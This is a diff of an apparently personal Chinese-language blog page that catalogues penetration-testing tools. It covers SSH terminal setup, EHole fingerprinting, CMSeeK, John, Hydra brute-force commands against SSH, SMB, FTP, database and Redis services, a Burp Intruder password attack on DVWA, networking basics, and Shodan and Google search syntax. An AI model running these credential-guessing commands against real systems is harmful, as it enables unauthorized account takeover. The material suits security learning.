@@ -65,7 +65,965 @@
         <div id="article">
             <div class="toc"></div>
             <div class="article-body">
-                <h1 id="tool"><a href="#tool" class="headerlink" title="tool"></a>tool</h1><h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h3><h5 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h5><p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">github下载fscan</a></p>
+                <h2 id="tool"><a href="#tool" class="headerlink" title="tool"></a>tool</h2><h3 id="综合工具"><a href="#综合工具" class="headerlink" title="综合工具"></a>综合工具</h3><h4 id="图形化渗透辅助工具-AuxTools"><a href="#图形化渗透辅助工具-AuxTools" class="headerlink" title="图形化渗透辅助工具 | AuxTools"></a>图形化渗透辅助工具 | AuxTools</h4><p><a target="_blank" rel="noopener" href="https://github.com/doimet/AuxTools/releases/tag/4.2">github项目地址</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520173636.png" alt="20240520173636"></p>
+<h3 id="终端工具"><a href="#终端工具" class="headerlink" title="终端工具"></a>终端工具</h3><h4 id="windows-terminal"><a href="#windows-terminal" class="headerlink" title="windows terminal"></a>windows terminal</h4><p>发现xshell不好用，写一个windows terminal,免密登录kail</p>
+<p>第一种，不使用证书免密登录，危害密码明文，危险性极大</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240427133255.png" alt="20240427133255"></p>
+<p>将命令行配置为如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell /c chcp 65001;plink -ssh 192.168.1.1 -l root -pw password</span><br><span class="line">cmd /c chcp 65001&amp;&amp;plink -ssh 192.168.1.1 -l root -pw password</span><br></pre></td></tr></table></figure>
+
+<p>65001开放端口，第一个以powershell为启动口<br>第二种以cmd为启动口</p>
+<h5 id="windows-terminal中保存SSH连接密码"><a href="#windows-terminal中保存SSH连接密码" class="headerlink" title="windows terminal中保存SSH连接密码"></a>windows terminal中保存SSH连接密码</h5><p><code>plink 192.168.1.1 -l root -pw password</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522222809.png" alt="20240522222809"></p>
+<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><ul>
+<li>ssh的连接</li>
+</ul>
+<p>powershell 直接 <code>ssh 用户名@ip</code> 输入密码就ok了</p>
+<p>但是powershell不是特别方便，想要保持连接，会比较麻烦</p>
+<h4 id="xshell"><a href="#xshell" class="headerlink" title="xshell"></a>xshell</h4><p><a target="_blank" rel="noopener" href="https://www.xshell.com/zh/free-for-home-school/">官网下载</a></p>
+<p>可以申请免费版授权</p>
+<ol>
+<li>xshell的连接</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240418194215.png" alt="20240418194215"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240418194414.png" alt="20240418194414"></p>
+<p>填入账号密码</p>
+<p>添加完之后直接右击，open就可以打开，密钥可以选择一次性保存，也可以选择永久保存</p>
+<h3 id="抓包工具"><a href="#抓包工具" class="headerlink" title="抓包工具"></a>抓包工具</h3><h4 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h4><p>下载</p>
+<ul>
+<li>利用burp抓取，postman,发出的流量包</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240417113546.png" alt="20240417113546"></p>
+<h3 id="指纹识别工具"><a href="#指纹识别工具" class="headerlink" title="指纹识别工具"></a>指纹识别工具</h3><h4 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a>EHole</h4><p>EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、vpn、Weblogic…)。<br>EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。<br>这款工具是棱角安全社区联合出品，配合其漏洞总结，这款工具是在平时渗透中无意发现的，效果非常好。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/Ehole">项目地址</a></p>
+<p>这个是利用go写的，所以我们需要搭建go的环境</p>
+<p>kail中直接输入go按照提示安装go即可</p>
+<ul>
+<li>kail部署EHole</li>
+</ul>
+<p>下载压缩包,unzip filename，解压压缩包</p>
+<p>进入文件夹，可能会有权限不足的情况</p>
+<p>进入root账户,<code>chmod 777 filename</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429135319.png" alt="20240429135319"></p>
+<p>给上执行权限，输入命令</p>
+<p><code>./EHole_linux_amd64 -h</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429135434.png" alt="20240429135434"></p>
+<p>安装成功</p>
+<ul>
+<li>使用简介</li>
+</ul>
+<p>我这里使用的是3.1</p>
+<p>例如使用指纹模块，查询help指令</p>
+<p><code>./EHole_linux_amd64 finger -h </code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429140643.png" alt="20240429140643"></p>
+<p>我这里就只有两个模块</p>
+<p>eg:<br>我先扫一下两个url的指纹<br>将url写入一个文件</p>
+<p>url.txt<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429141020.png" alt="20240429141020"></p>
+<p><code>./EHole_linux_amd64 finger -l url.txt</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429141102.png" alt="20240429141102"></p>
+<p>其他指令看参数执行即可</p>
+<h4 id="kail-cmsseek（比较老的工具）"><a href="#kail-cmsseek（比较老的工具）" class="headerlink" title="kail cmsseek（比较老的工具）"></a>kail cmsseek（比较老的工具）</h4><p>直接输入<code>cmseek</code></p>
+<p>输入y，kail就会自动帮你安装，但是很多情况下会因为网不好下载失败</p>
+<p>然后国内的源是没有cmseek的</p>
+<p>有其他工具建议使用其他的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">github项目地址</a></p>
+<p>手动从github上面下载，装入kail</p>
+<p>输入<code>./cmseek.py -h </code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240429204809.png" alt="20240429204809"></p>
+<p>安装成功</p>
+<p>也可以直接输入<code>./cmseek.py</code></p>
+<p>然后选择使用,也可以利用python参数去使用</p>
+<h3 id="弱密码工具"><a href="#弱密码工具" class="headerlink" title="弱密码工具"></a>弱密码工具</h3><h4 id="john密码破解工具"><a href="#john密码破解工具" class="headerlink" title="john密码破解工具"></a>john密码破解工具</h4><p>使用方法<code>touch 1.txt</code>创建文件夹，将需要解密的文件放入</p>
+<p><code>john 1.txt</code></p>
+<h4 id="超级弱口令检查工具"><a href="#超级弱口令检查工具" class="headerlink" title="超级弱口令检查工具"></a>超级弱口令检查工具</h4><p><a target="_blank" rel="noopener" href="https://github.com/shack2/SNETCracker/releases/tag/1.0.20190715">github开源地址</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520122225.png" alt="20240520122225"></p>
+<h4 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra 九头蛇"></a>Hydra 九头蛇</h4><p>集成在kail中</p>
+<p>参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line"></span><br><span class="line">-l 指定用户名</span><br><span class="line">-p 指定密码</span><br><span class="line">-L 指定用户名字典</span><br><span class="line">-P 指定密码字典</span><br><span class="line">-C 指定所用格式为“user:password&#x27;的字典文件</span><br><span class="line">-e</span><br><span class="line">n null，表示尝试空密码</span><br><span class="line">s same，把用户名本身当做密码进行尝试</span><br><span class="line">r 反向，把用户名倒叙，当做密码进行尝试。</span><br><span class="line">-vV 显示执行细节</span><br><span class="line">-o 保存执行结果</span><br><span class="line">-s 指定非默认端口</span><br><span class="line">-M 指定破解的目标文件，如果不是默认端口，后面跟上“:port&#x27;</span><br><span class="line">-t 指定爆破时的任务数量（默认16）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>简单使用</li>
+</ol>
+<p>爆破ssh</p>
+<p>用 -l 参数指定用户名，-p参数指定密码，后面直接跟目标的IP地址和协议。</p>
+<p><code>hydra -l root -p 12345678 192.168.31.173 ssh</code><br><code>hydra -l root -p 12345678 ssh://192.168.31.173</code><br><code>hydra -l root -P 密码字典 ssh://192.168.31.173</code><br><code>hydra -l root -P 密码字典 ssh://192.168.31.173</code></p>
+<p>成功的话，会把账号和密码高亮显示出来。</p>
+<p>如果想看爆破的过程，可以加上 -vV参数，显示执行细节</p>
+<p><code>hydra -l root -P pwd.txt 192.168.31.173 ssh -vV</code></p>
+<p>一般爆破其他常见服务就是修改一下协议和默认用户就ok了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">共享文件（SMB）</span><br><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 smb</span><br><span class="line"></span><br><span class="line">文件传输（FTP）</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 ftp</span><br><span class="line"></span><br><span class="line">邮箱协议（POP3）</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 pop3</span><br><span class="line"></span><br><span class="line">mysql数据库</span><br><span class="line">hydra -l sa -P 密码字典 192.168.31.173 mysql</span><br><span class="line"></span><br><span class="line">MSSQL数据库</span><br><span class="line">hydra -l sa -P 密码字典 192.168.31.173 mssql</span><br><span class="line"></span><br><span class="line">PgSQL数据库</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 postgresql</span><br><span class="line"></span><br><span class="line">Redis数据库</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 redis</span><br><span class="line"></span><br><span class="line">Oracle数据库</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 oracle</span><br></pre></td></tr></table></figure>
+
+<p>以此类推</p>
+<ol start="2">
+<li>kail自带密码字典</li>
+</ol>
+<p>在 &#x2F;usr&#x2F;share&#x2F;wordlists 目录下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240427192206.png" alt="20240427192206"></p>
+<h4 id="burp的-intruder-模块"><a href="#burp的-intruder-模块" class="headerlink" title="burp的 intruder 模块"></a>burp的 intruder 模块</h4><p>这一个模块被我归类于弱密码工具，其实是不正确的，因为对于这个模块的功能非常的多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">猜测用户名、密码</span><br><span class="line">寻找参数、目录</span><br><span class="line">模糊测试</span><br><span class="line">等等</span><br></pre></td></tr></table></figure>
+
+<p>burp唯一不好的就是，批量处理不够方便，但是对于针对一个网站的弱密码进行攻击却是一个很好用的东西</p>
+<p>打开DVWA</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416130435.png" alt="20240416130435"></p>
+<p>将安全等级设置为<code>LOW</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416130538.png" alt="20240416130538"></p>
+<p>然后抓包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416133609.png" alt="20240416133609"></p>
+<p>发送到攻击模块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416132955.png" alt="20240416132955"></p>
+<p>在burp的攻击模块中被<code>§§</code>这个字符中间就是我们控制的变量，burp会改变这个中间的值，去批量发包，进行密码爆破</p>
+<p>intruder 攻击模块的攻击模式有四个，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416133710.png" alt="20240416133710"></p>
+<p>然后我们现在是对，多个参数变量，使用不同的字典来进行爆破<br>所以就使用集束炸弹来攻击</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416133851.png" alt="20240416133851"></p>
+<p>我们只需要对username和password进行攻击就可以</p>
+<p>采用这种爆破模式流量是非常非常大的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416135329.png" alt="20240416135329"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416135408.png" alt="20240416135408"></p>
+<p>这就是爆破结果，但是我们的爆破失败了，因为字典可能有问题，一般的话我们可以利用length，返回前端的长度来判断，哪一个是否是正确的</p>
+<h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h3><p>信息收集，大概就两类，主动信息收集(主动去和目标机进行交互获取信息 容易被ban ip) 和被动收集(不与目标机器交互 利用第三方站点去收集信息)</p>
+<h4 id="knowledge（信息收集）"><a href="#knowledge（信息收集）" class="headerlink" title="knowledge（信息收集）"></a>knowledge（信息收集）</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/AliceNo/article/details/134973818">引用</a></p>
+<ul>
+<li>超基础内容</li>
+</ul>
+<p>osi 物理层、数据链路层、网络层、传输层、会话层、表示层和应用层（7层）<br>tcp 物理层、数据链路层、网络层、运输层、应用层（5层）</p>
+<ul>
+<li>TCP每层所使用的协议</li>
+</ul>
+<ol>
+<li><p>HTTP（超文本传输协议）<br>HTTP是用于在Web浏览器和Web服务器之间传输超文本的协议。它定义了客户端（通常是Web浏览器）和服务器之间的通信规则。通过HTTP，用户能够在浏览器中请求和接收Web页面、图像、视频等资源。</p>
+</li>
+<li><p>FTP（文件传输协议）<br>FTP是用于在网络上传输文件的协议。它允许用户从一个主机向另一个主机上传或下载文件。FTP支持匿名登录和安全身份验证，使得文件共享变得更加灵活。</p>
+</li>
+</ol>
+<p>访问方式可以利用工具，例如XFTP,<a href="ftp://x.x.x.x/">ftp://x.x.x.x</a> 进行文件访问<br>若是存在ftp文件泄露漏洞可以用于获取源码<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240428134334.png" alt="20240428134334"></p>
+<ol start="3">
+<li><p>SMTP（简单邮件传输协议）<br>SMTP是用于在网络上传输电子邮件的协议。它定义了电子邮件的发送规则和格式，确保电子邮件能够从发件人传递到收件人的电子邮件服务器，并最终被投递到收件人的邮箱。</p>
+</li>
+<li><p>POP3（邮局协议第3版）<br>POP3是用于从邮件服务器上检索电子邮件的协议。它允许用户通过邮件客户端下载存储在邮件服务器上的邮件，以便在本地进行查看和管理。</p>
+</li>
+<li><p>IMAP（互联网消息访问协议）<br>IMAP也是用于从邮件服务器上检索电子邮件的协议，但与POP3不同，IMAP在服务器上保留邮件的副本，允许用户在不同设备上同步查看邮件。</p>
+</li>
+<li><p>DNS（域名系统）<br>DNS是用于将域名映射到IP地址的协议。它使得用户可以通过易记的域名访问互联网资源，而无需记住复杂的IP地址。</p>
+</li>
+</ol>
+<ul>
+<li>运输层 使用的协议<br>运输层负责端到端的通信，确保数据的可靠传输。最常见的运输层协议是TCP（传输控制协议）和UDP（用户数据报协议）。TCP提供可靠的、面向连接的通信，而UDP提供不可靠但更高效的通信。运输层还处理数据分段、流控制和差错恢复等功能。</li>
+</ul>
+<p>TCP（传输控制协议）<br>TCP（Transmission Control Protocol）是一种面向连接的、可靠的传输层协议。它确保在通信的两端建立可靠的连接，并提供错误检测、流控制和重传机制，以确保数据的完整性和可靠性。以下是TCP的主要特点：</p>
+<p>面向连接： 在数据传输之前，TCP会在通信的两端建立连接。这种连接是全双工的，允许双方在任何时候都能发送和接收数据。</p>
+<p>可靠性： TCP使用序列号和确认机制来确保数据的可靠传输。如果发送方没有收到接收方的确认，它会重发数据，直到确认成功。</p>
+<p>流控制： TCP使用滑动窗口协议进行流控制，确保发送方不会发送过多的数据，防止接收方不堪重负。</p>
+<p>拥塞控制： TCP通过拥塞窗口调整来适应网络状况，以防止网络拥塞。它会根据网络的拥塞程度调整数据的发送速率。</p>
+<p>应用广泛： TCP常被用于需要可靠数据传输的应用，如Web浏览、文件传输、电子邮件等。</p>
+<p>UDP（用户数据报协议）<br>UDP（User Datagram Protocol）是一种无连接的、不可靠的传输层协议。与TCP不同，UDP不建立连接，也不提供可靠性和流控制，因此适用于一些对实时性要求较高、允许少量数据丢失的应用。以下是UDP的主要特点：</p>
+<p>无连接： UDP在传输数据之前不需要建立连接，因此通信的开销较小。</p>
+<p>不可靠性： 由于不提供确认和重传机制，UDP对数据的传输没有可靠性保障，可能导致数据的丢失或乱序。</p>
+<p>快速： 由于简化了连接管理和错误处理，UDP通常比TCP更快，适用于实时性要求较高的应用。</p>
+<p>广播和多播： UDP支持广播和多播传输，使得它适用于一对多或多对多的通信模式。</p>
+<p>应用场景： UDP常被用于音频、视频流传输、在线游戏等对实时性要求较高，可以容忍少量数据丢失的应用。</p>
+<ul>
+<li>网络层<br>网络层负责将数据从源主机传输到目标主机，通过路由器实现不同网络之间的通信。IP协议是网络层的核心协议，它定义了数据在网络中的传输方式。路由器根据目标IP地址将数据包转发到正确的目标网络，使得数据能够正确地到达目的地。</li>
+</ul>
+<p>IP（Internet Protocol）是互联网中使用的网络层协议，它负责在网络上标识和定位设备，并提供数据包的传输。IP协议的主要版本包括IPv4（Internet Protocol version 4）和IPv6（Internet Protocol version 6）。</p>
+<p>IPv4（Internet Protocol version 4）<br>IPv4是最早广泛使用的IP协议版本，它使用32位地址，通常表示为点分十进制（例如，192.168.1.1）。IPv4地址空间有限，仅支持约42亿个不同的地址，由于互联网的迅速发展，IPv4地址耗尽成为一个问题。IPv4的主要特点包括：</p>
+<p>32位地址： IPv4地址由32位二进制数表示，分为四组8位，以点分十进制形式呈现。</p>
+<p>地址耗尽： 由于IPv4地址空间有限，导致IPv4地址的快速耗尽。为了解决这个问题，IPv6被引入。</p>
+<p>子网划分： IPv4支持将地址空间划分为多个子网，以更有效地管理地址。</p>
+<p>NAT（网络地址转换）： 由于IPv4地址短缺，NAT技术被广泛使用，允许多个设备共享一个公共IP地址。</p>
+<p>IPv6（Internet Protocol version 6）<br>IPv6是IPv4的后继者，旨在解决IPv4地址空间有限的问题。IPv6采用128位地址，通常表示为冒号分隔的八组16位的十六进制数（例如，2001:0db8:85a3:0000:0000:8a2e:0370:7334）。IPv6的主要特点包括：</p>
+<p>128位地址： IPv6地址长度更长，提供了远远超过IPv4的地址空间，支持约3.4 x 10^38个不同的地址。</p>
+<p>地址配置： IPv6引入了更简化的地址配置过程，支持自动地址分配和配置。</p>
+<p>消除NAT： 由于IPv6地址足够充足，NAT不再是必需的，每个设备可以拥有全局唯一的地址。</p>
+<p>IPv6 over IPv4隧道： 为了过渡期间的互操作性，IPv6支持通过IPv4网络传输的IPv6数据包，这被称为IPv6 over IPv4隧道。</p>
+<p>移动性支持： IPv6内建对移动设备的更好支持，简化了移动IP的实现。</p>
+<ul>
+<li>数据链路层<br>数据链路层处理相邻节点之间的数据传输，负责将网络层的数据包封装成帧，并通过物理层进行传输。该层还涉及物理寻址、错误检测和流量控制等功能。以太网是数据链路层中应用最广泛的协议之一。</li>
+</ul>
+<p>数据链路层包括两个子层，即逻辑链路控制（LLC，Logical Link Control）子层和介质访问控制（MAC，Media Access Control）子层。</p>
+<ol>
+<li>逻辑链路控制（LLC）子层<br>逻辑链路控制子层负责建立、维护和释放逻辑链路（Logical Link）以及错误检测和流控制。主要特点包括：</li>
+</ol>
+<p>逻辑链路： 在通信的两端建立逻辑链路，为网络层提供可靠的数据传输服务。</p>
+<p>错误检测： 提供对数据帧的错误检测和纠正，以确保数据的可靠传输。</p>
+<p>流控制： 在逻辑链路上实现流控制，以防止发送方发送过多的数据导致接收方不堪重负。</p>
+<ol start="2">
+<li>介质访问控制（MAC）子层<br>介质访问控制子层负责管理物理介质的访问，以确保在共享介质上进行的数据传输的协调和冲突的解决。主要特点包括：</li>
+</ol>
+<p>地址分配： 为每个设备分配唯一的硬件地址，通常称为MAC地址，以便在共享介质上唯一标识每个设备。</p>
+<p>介质访问： 确保多个设备能够在共享介质上有序地进行数据传输，避免碰撞和冲突。</p>
+<p>流控制： 在物理层之上实现流控制，以防止发送方发送数据速率过快，导致冲突和数据丢失。</p>
+<p>物理层<br>物理层是TCP&#x2F;IP体系结构的最底层，它处理实际的硬件设备和传输介质。该层定义了数据在物理媒介上的传输方式，如电缆、光纤或空气中的无线信号。物理层确保比特流能够在不同设备之间正确传输。</p>
+<p>物理层是TCP&#x2F;IP四层体系结构中的最底层，负责处理实际的硬件设备和传输介质，以确保比特流能够在不同设备之间正确传输。该层定义了数据在物理媒介上的传输方式，包括电缆、光纤、无线信号等。</p>
+<p>物理层的主要任务包括：<br>传输介质： 物理层定义了数据在传输介质上的传输方式，包括信号的编码、调制解调器的使用等。不同的传输介质需要不同的物理层实现。</p>
+<p>连接器和接口： 物理层规定了设备之间的物理连接方式，包括连接器、电缆和接口标准。这确保了设备能够正确地连接并交换信息。</p>
+<p>时钟同步： 物理层负责确保数据传输的时钟同步，以使接收方能够正确地解码发送方发送的比特流。</p>
+<p>拓扑结构： 物理层定义了网络的拓扑结构，即设备如何连接和组织。常见的拓扑结构包括星型、总线型、环型等。</p>
+<p>电气特性： 物理层规定了数据传输时的电气特性，包括电压、电流、信号强度等。这确保了数据的可靠传输。</p>
+<p>物理地址： 在物理层，设备使用物理地址来唯一标识自己。在以太网中，这个地址被称为MAC地址。</p>
+<p>比特传输： 物理层负责将比特流从一个设备传输到另一个设备，确保在传输过程中不发生错误。</p>
+<ul>
+<li>物理层的典型技术和标准包括：<br>以太网标准： 定义了在局域网中使用的物理层和数据链路层的标准，包括传输介质、帧格式和数据传输速率等。</li>
+</ul>
+<p>Wi-Fi标准： 用于无线局域网的物理层和数据链路层标准，规定了无线信号的频率、编码和调制方式等。</p>
+<p>传输介质标准： 定义了不同传输介质的物理层特性，如电缆、光纤和同轴电缆等。</p>
+<p>物理连接标准： 规定了设备之间物理连接的标准，包括连接器、插头和接口的形状和规格。</p>
+<ul>
+<li>收集内容</li>
+</ul>
+<p><code>地址、公司地址、邮件地址、域名信息、联系电话、公司组织、技术成员、网站技术架构、主机存活情况、端口信息、敏感信息</code></p>
+<h4 id="Shodan搜索引擎"><a href="#Shodan搜索引擎" class="headerlink" title="Shodan搜索引擎"></a>Shodan搜索引擎</h4><p><a target="_blank" rel="noopener" href="https://www.shodan.io/">shodan官网</a></p>
+<ul>
+<li>很多搜索引擎都会有自己的过滤语法，可以去参照该搜索引擎给的语法</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.shodan.io/search/filters">shodan官方语法链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">常见用的过滤命令如下所示:</span><br><span class="line">hostname：搜索指定的主机或域名，例如 hostname:&quot;google&quot;</span><br><span class="line">port：搜索指定的端口或服务，例如 port:&quot;21&quot;</span><br><span class="line">country：搜索指定的国家，例如 country:&quot;CN&quot;</span><br><span class="line">city：搜索指定的城市，例如 city:&quot;Hefei&quot;</span><br><span class="line">org：搜索指定的组织或公司，例如 org:&quot;google&quot;</span><br><span class="line">isp：搜索指定的ISP供应商，例如 isp:&quot;China Telecom&quot;</span><br><span class="line">product：搜索指定的操作系统/软件/平台，例如 product:&quot;Apache httpd&quot;</span><br><span class="line">version：搜索指定的软件版本，例如 version:&quot;1.6.2&quot;</span><br><span class="line">geo：搜索指定的地理位置，参数为经纬度，例如 geo:&quot;31.8639, 117.2808&quot;</span><br><span class="line">before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:&quot;11-11-15&quot;</span><br><span class="line">net：搜索指定的IP地址或子网，例如 net:&quot;210.45.240.0/24&quot;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>基本用法</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240419143644.png" alt="20240419143644"></p>
+<p>搜索中国，直接搜索什么意思呢，就是网站的前端的页面源代码会出现这个关键词</p>
+<p>想要查看某个ip的详细信息就使用<code>https://www.shodan.io/host/[IP]</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240419144852.png" alt="20240419144852"></p>
+<p>上图中我们可以从顶部在地图中看到主机的物理地址，从左侧了解到主机的相关信息，右侧则包含目标主机的端口列表及其详细信息。</p>
+<p>商业的api还可以获取网站CVE</p>
+<ol start="2">
+<li>搜索例子</li>
+</ol>
+<p>查找位于株洲的 Apache 服务器：<br><code>apache city:&quot;Zhuzhou&quot;</code></p>
+<p>查找位于国内的 Nginx 服务器：<br><code>nginx country:&quot;CN&quot;</code></p>
+<p>查找 GWS(Google Web Server) 服务器：<br><code>&quot;Server: gws&quot; hostname:&quot;google&quot;</code></p>
+<p>查找指定网段的华为设备：<br><code>huawei net:&quot;61.191.146.0/24&quot;</code></p>
+<p>如上通过在基本关键字后增加指定的过滤关键字，能快速的帮助发现我们感兴趣的内容。当然，还有更快速更有意思的方法，那就是点击 Shodan 搜索栏右侧的 “Explore’ 按钮，就会得到很多别人分享的搜索语法</p>
+<p>为什么要看别人的语法呢，因为别人可能实在进行漏扫之类操作，然后用语法来搜索他这个漏洞攻击的框架</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240419151234.png" alt="20240419151234"></p>
+<p>Shodan 不仅可以查找网络设备，它还具有其他相当不错的功能。</p>
+<p>Exploits：每次查询完后，点击页面上的 “Exploits’ 按钮，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：<a target="_blank" rel="noopener" href="https://exploits.shodan.io/welcome">https://exploits.shodan.io/welcome</a></p>
+<ol start="3">
+<li>命令行使用shadan</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/12500762.html">继续学习</a></p>
+<h4 id="goole语法"><a href="#goole语法" class="headerlink" title="goole语法"></a>goole语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">基础搜索语法</span><br><span class="line">关键词搜索：直接输入关键词或短语。</span><br><span class="line">双引号精确搜索：使用双引号（&quot;&quot;）进行精确短语搜索。</span><br><span class="line">减号排除关键词：使用减号（-）来排除某些词汇。</span><br><span class="line"></span><br><span class="line">高级搜索语法</span><br><span class="line">site:：限定在特定网站或域内搜索，如site:wikipedia.org。</span><br><span class="line">intitle:：搜索标题中包含特定词汇的网页，如intitle:气候变化。</span><br><span class="line">allintitle:：确保所有列出的词汇都在网页标题中，如allintitle:气候变化 太平洋。</span><br><span class="line">inurl:：搜索URL中包含特定词汇的网页，如inurl:blog。</span><br><span class="line">allinurl:：确保所有列出的词汇都在URL中。</span><br><span class="line">intext:：搜索网页正文中包含特定词汇的结果，如intext:环保技术。</span><br><span class="line">allintext:：确保所有列出的词汇都在网页正文中。</span><br><span class="line">filetype:：搜索特定文件类型的文档，如filetype:pdf。</span><br><span class="line">related:：查找与特定网站内容相似的网站，如related:nytimes.com。</span><br><span class="line">cache:：显示Google缓存中的网页版本，如cache:wikipedia.org。</span><br><span class="line">AROUND(X)：搜索两个词汇在文本中相隔不超过X个单词的页面。</span><br><span class="line"></span><br><span class="line">组合使用</span><br><span class="line">逻辑运算符：使用AND、OR和NOT（或使用-）来组合不同的搜索条件。</span><br><span class="line">括号：使用括号来组合复杂的查询，如（太阳能 OR 风能）AND 存储。</span><br><span class="line"></span><br><span class="line">特殊搜索技巧</span><br><span class="line">星号通配符：使用星号（*）作为通配符来代替任意词汇或短语。</span><br><span class="line">数字范围：使用两个点（..）来搜索一个数值范围，如2005..2015。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
